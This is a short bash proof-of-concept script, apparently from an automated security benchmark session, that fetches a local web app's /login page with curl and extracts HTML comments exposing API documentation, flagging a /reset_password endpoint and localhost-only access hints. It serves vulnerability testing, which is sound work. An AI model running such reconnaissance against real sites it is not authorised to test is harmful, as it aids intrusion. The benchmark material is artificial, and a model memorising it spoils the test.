#!/bin/bash
# POC: Demonstrates information disclosure through API documentation in HTML comments, revealing all application endpoints including sensitive /reset_password functionality
# Target: ./repo
# Created: 2025-11-10T14:42:03.743Z
# Session: benchmark-XBEN-024-24-mht8yjhk

# Information Disclosure - API Documentation in HTML Comments POC
# This script demonstrates the vulnerability where sensitive API documentation
# is exposed in HTML comments on the /login endpoint

TARGET_URL="${1:-http://localhost:3000}"
ENDPOINT="/login"

echo "[*] Target: $TARGET_URL$ENDPOINT"
echo "[*] Fetching page and extracting HTML comments..."
echo ""

# Fetch the page and extract HTML comments
RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT")

# Check if the response contains HTML comments
if echo "$RESPONSE" | grep -q '<!--'; then
    echo "[+] HTML comments found! Extracting documentation..."
    echo ""
    
    # Extract and display the comments
    echo "=== API DOCUMENTATION EXTRACTED FROM HTML COMMENTS ==="
    echo "$RESPONSE" | grep -A 1000 '<!--' | grep -B 1000 '-->' | head -100
    echo ""
    
    # Check specifically for sensitive endpoints
    if echo "$RESPONSE" | grep -q 'reset_password'; then
        echo "[!] CRITICAL: Sensitive endpoint /reset_password documented in comments!"
        echo "[!] This reveals the existence of a password reset functionality"
    fi
    
    if echo "$RESPONSE" | grep -q 'localhost'; then
        echo "[!] WARNING: Comment reveals localhost-only access control information"
    fi
    
    echo ""
    echo "[+] Vulnerability confirmed: API documentation is publicly accessible in HTML comments"
else
    echo "[-] No HTML comments found in response"
    exit 1
fi